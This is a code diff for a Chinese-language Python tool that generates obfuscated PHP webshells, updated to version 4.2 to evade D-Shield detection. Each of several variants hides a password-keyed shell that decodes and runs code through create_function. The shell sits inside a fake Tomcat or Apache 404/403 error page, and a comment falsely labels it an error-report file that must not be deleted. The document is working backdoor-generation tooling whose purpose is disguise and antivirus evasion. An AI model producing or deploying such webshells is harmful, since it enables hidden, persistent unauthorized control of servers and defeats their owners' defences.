@@ -74,7 +74,11 @@ def free_kill(php_name):
 <?php
 $a='str_';
 $b=$a.'replace';//此文件是报告错误文件，请勿删除
-$rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
+$r_e_p=substr($b,6);
+$r_e_p_1='zxcszxctzxcrzxc_zxcrzxcezxc';
+$r_e_p_1=substr_replace('zxc','str_re',$r_e_p_1);
+$r_e_p=$r_e_p_1.$r_e_p;
+$rep = $r_e_p("{replace_string[1]}", "", "{replace_string[0]}");
 $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
 $ba1=substr($base,6);
 $ba2='bzxcazxcszxcezxc6zxc4';
@@ -112,147 +116,163 @@ $p();
         <p>
         <b>Type</b> Status Report</p>
         <p><b>Message</b> Not found</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.21</h3></body></html>
-        <?php
-        $a='str_';
-        $b=$a.'replace';//此文件是报告错误文件，请勿删除
-        $rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
-        $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
-        $ba1=substr($base,6);
-        $ba2='bzxcazxcszxcezxc6zxc4';
-        $base=substr_replace('zxc','base64',$ba2);
-        $base=$base.$ba1;
-        $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
-        $func1 = substr($func,6);
-		$func2='cwsxrwsxewsxawsxtwsxewsx';
-		$func2=substr_replace('wsx','create',$func2);
-		$func = $func2.$func1;
-        $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
-        $p_2 = "{keys}";
-        $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
-        #echo $p_1.$p_2.$p_3;
-        @$p = $func("", $p_1.$p_2.$p_3);
-        $p();
-        ?>
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
+<?php
+$a='str_';
+$b=$a.'replace';//此文件是报告错误文件，请勿删除
+$r_e_p=substr($b,6);
+$r_e_p_1='zxcszxctzxcrzxc_zxcrzxcezxc';
+$r_e_p_1=substr_replace('zxc','str_re',$r_e_p_1);
+$r_e_p=$r_e_p_1.$r_e_p;
+$rep = $r_e_p("{replace_string[1]}", "", "{replace_string[0]}");
+$base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
+$ba1=substr($base,6);
+$ba2='bzxcazxcszxcezxc6zxc4';
+$base=substr_replace('zxc','base64',$ba2);
+$base=$base.$ba1;
+$func = $base($rep("{fun[1]}", "", "{fun[0]}"));
+$func1 = substr($func,6);
+$func2='cwsxrwsxewsxawsxtwsxewsx';
+$func2=substr_replace('wsx','create',$func2);
+$func = $func2.$func1;
+$p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
+$p_2 = "{keys}";
+$p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
+#echo $p_1.$p_2.$p_3;
+@$p = $func("", $p_1.$p_2.$p_3);
+$p();
+?>
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
                     """
             elif a == '3':
                 statement = f"""
-        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-        <html><head>
-        <title>404 Not Found</title>
-        </head><body>
-        <h1>Not Found</h1>
-        <p>The requested URL was not found on this server.</p>
-        </body></html>
-        <?php
-        $a='str_';
-        $b=$a.'replace';//此文件是报告错误文件，请勿删除
-        $rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
-        $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
-        $ba1=substr($base,6);
-        $ba2='bzxcazxcszxcezxc6zxc4';
-        $base=substr_replace('zxc','base64',$ba2);
-        $base=$base.$ba1;
-        $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
-        $func1 = substr($func,6);
-		$func2='cwsxrwsxewsxawsxtwsxewsx';
-		$func2=substr_replace('wsx','create',$func2);
-		$func = $func2.$func1;
-        $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
-        $p_2 = "{keys}";
-        $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
-        #echo $p_1.$p_2.$p_3;
-        @$p = $func("", $p_1.$p_2.$p_3);
-        $p();
-        ?>
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
-        <!-- a padding to disable MSIE and Chrome friendly error page -->
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+</body></html>
+<?php
+$a='str_';
+$b=$a.'replace';//此文件是报告错误文件，请勿删除
+$r_e_p=substr($b,6);
+$r_e_p_1='zxcszxctzxcrzxc_zxcrzxcezxc';
+$r_e_p_1=substr_replace('zxc','str_re',$r_e_p_1);
+$r_e_p=$r_e_p_1.$r_e_p;
+$rep = $r_e_p("{replace_string[1]}", "", "{replace_string[0]}");
+$base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
+$ba1=substr($base,6);
+$ba2='bzxcazxcszxcezxc6zxc4';
+$base=substr_replace('zxc','base64',$ba2);
+$base=$base.$ba1;
+$func = $base($rep("{fun[1]}", "", "{fun[0]}"));
+$func1 = substr($func,6);
+$func2='cwsxrwsxewsxawsxtwsxewsx';
+$func2=substr_replace('wsx','create',$func2);
+$func = $func2.$func1;
+$p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
+$p_2 = "{keys}";
+$p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
+#echo $p_1.$p_2.$p_3;
+@$p = $func("", $p_1.$p_2.$p_3);
+$p();
+?>
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
                     """
             elif a == '4':
                 ip = input("伪装4需要目标Ip，输入对方服务器ip：")
                 statement = f"""
-                        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-                        <html><head>
-                        <title>403 Forbidden</title>
-                        </head><body>
-                        <h1>Forbidden</h1>
-                        <p>You don't have permission to access this resource.</p>
-                        <hr>
-                        <address>Apache/2.4.46 (Ubuntu) Server at {ip} Port 80</address>
-                        </body></html>
-                        <?php
-                        $a='str_';
-                        $b=$a.'replace';//此文件是报告错误文件，请勿删除
-                        $rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
-                        $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
-                        $ba1=substr($base,6);
-                        $ba2='bzxcazxcszxcezxc6zxc4';
-                        $base=substr_replace('zxc','base64',$ba2);
-                        $base=$base.$ba1;
-                        $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
-                        $func1 = substr($func,6);
-                		$func2='cwsxrwsxewsxawsxtwsxewsx';
-                		$func2=substr_replace('wsx','create',$func2);
-                		$func = $func2.$func1;
-                        $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
-                        $p_2 = "{keys}";
-                        $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
-                        #echo $p_1.$p_2.$p_3;
-                        @$p = $func("", $p_1.$p_2.$p_3);
-                        $p();
-                        ?>
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this resource.</p>
+<hr>
+<address>Apache/2.4.46 (Ubuntu) Server at {ip} Port 80</address>
+</body></html>
+<?php
+$a='str_';
+$b=$a.'replace';//此文件是报告错误文件，请勿删除
+$r_e_p=substr($b,6);
+$r_e_p_1='zxcszxctzxcrzxc_zxcrzxcezxc';
+$r_e_p_1=substr_replace('zxc','str_re',$r_e_p_1);
+$r_e_p=$r_e_p_1.$r_e_p;
+$rep = $r_e_p("{replace_string[1]}", "", "{replace_string[0]}");
+$base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
+$ba1=substr($base,6);
+$ba2='bzxcazxcszxcezxc6zxc4';
+$base=substr_replace('zxc','base64',$ba2);
+$base=$base.$ba1;
+$func = $base($rep("{fun[1]}", "", "{fun[0]}"));
+$func1 = substr($func,6);
+$func2='cwsxrwsxewsxawsxtwsxewsx';
+$func2=substr_replace('wsx','create',$func2);
+$func = $func2.$func1;
+$p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
+$p_2 = "{keys}";
+$p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
+#echo $p_1.$p_2.$p_3;
+@$p = $func("", $p_1.$p_2.$p_3);
+$p();
+?>
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
                                     """
             elif a == '5':
                 statement = f"""
-                        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-                        <html><head>
-                        <title>403 Forbidden</title>
-                        </head><body>
-                        <h1>Forbidden</h1>
-                        <p>You don't have permission to access this resource.</p>
-                        </body></html>
-                        <?php
-                        $a='str_';
-                        $b=$a.'replace';//此文件是报告错误文件，请勿删除
-                        $rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
-                        $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
-                        $ba1=substr($base,6);
-                        $ba2='bzxcazxcszxcezxc6zxc4';
-                        $base=substr_replace('zxc','base64',$ba2);
-                        $base=$base.$ba1;
-                        $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
-                        $func1 = substr($func,6);
-                		$func2='cwsxrwsxewsxawsxtwsxewsx';
-                		$func2=substr_replace('wsx','create',$func2);
-                		$func = $func2.$func1;
-                        $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
-                        $p_2 = "{keys}";
-                        $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
-                        #echo $p_1.$p_2.$p_3;
-                        @$p = $func("", $p_1.$p_2.$p_3);
-                        $p();
-                        ?>
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
-                        <!-- a padding to disable MSIE and Chrome friendly error page -->
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this resource.</p>
+</body></html>
+<?php
+$a='str_';
+$b=$a.'replace';//此文件是报告错误文件，请勿删除
+$r_e_p=substr($b,6);
+$r_e_p_1='zxcszxctzxcrzxc_zxcrzxcezxc';
+$r_e_p_1=substr_replace('zxc','str_re',$r_e_p_1);
+$r_e_p=$r_e_p_1.$r_e_p;
+$rep = $r_e_p("{replace_string[1]}", "", "{replace_string[0]}");
+$base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
+$ba1=substr($base,6);
+$ba2='bzxcazxcszxcezxc6zxc4';
+$base=substr_replace('zxc','base64',$ba2);
+$base=$base.$ba1;
+$func = $base($rep("{fun[1]}", "", "{fun[0]}"));
+$func1 = substr($func,6);
+$func2='cwsxrwsxewsxawsxtwsxewsx';
+$func2=substr_replace('wsx','create',$func2);
+$func = $func2.$func1;
+$p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
+$p_2 = "{keys}";
+$p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
+#echo $p_1.$p_2.$p_3;
+@$p = $func("", $p_1.$p_2.$p_3);
+$p();
+?>
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
                                     """
             elif a == '6':
                 ml = input("此需要一个错误的路径(如： /cs/默认的是/config/)：")
@@ -357,7 +377,7 @@ $p();
 
 
 if __name__ == "__main__":
-    name = f"{colored('webshell_bypass_php_4.1 by 弱鸡', 'green')}" \
+    name = f"{colored('webshell_bypass_php_4.2 by 弱鸡', 'green')}" \
            "\n\n交流群：184324009"
     arg = ArgumentParser(description=name)
     arg.add_argument("-p",
@@ -380,7 +400,7 @@ if __name__ == "__main__":
             current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))#获取当前时间
             print(f"""
             ---------------------------------------
-            {colored('php_弱鸡_webshelll免杀生成 4.1', 'red')}
+            {colored('php_弱鸡_webshelll免杀生成 4.2', 'red')}
             密码随机                            
             伪装1和3适用于linux服务器
             伪装2适用于iis服务器
@@ -395,6 +415,7 @@ if __name__ == "__main__":
             版本3.0：对一些敏感函数加密
             版本4.0：修复了使用错误
                     4.1：修改了报错问题
+                    4.2：绕过d盾牌检测
             ---------------------------------------
             配置信息
             默认生成shell文件路径：{path}
@@ -409,7 +430,7 @@ if __name__ == "__main__":
                 current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
                 print(f"""
                 ---------------------------------------
-                {colored('php_弱鸡_webshelll免杀生成 4.1', 'red')}
+                {colored('php_弱鸡_webshelll免杀生成 4.2', 'red')}
                 密码随机                            
                 伪装1和3适用于linux服务器
                 伪装2适用于iis服务器
@@ -424,6 +445,7 @@ if __name__ == "__main__":
                 版本3.0：对一些敏感函数加密
                 版本4.0：修复了使用错误
                         4.1：修改了报错问题
+                        4.2：绕过d盾牌检测
                 ---------------------------------------
                 配置信息
                 默认生成shell文件路径：{path}
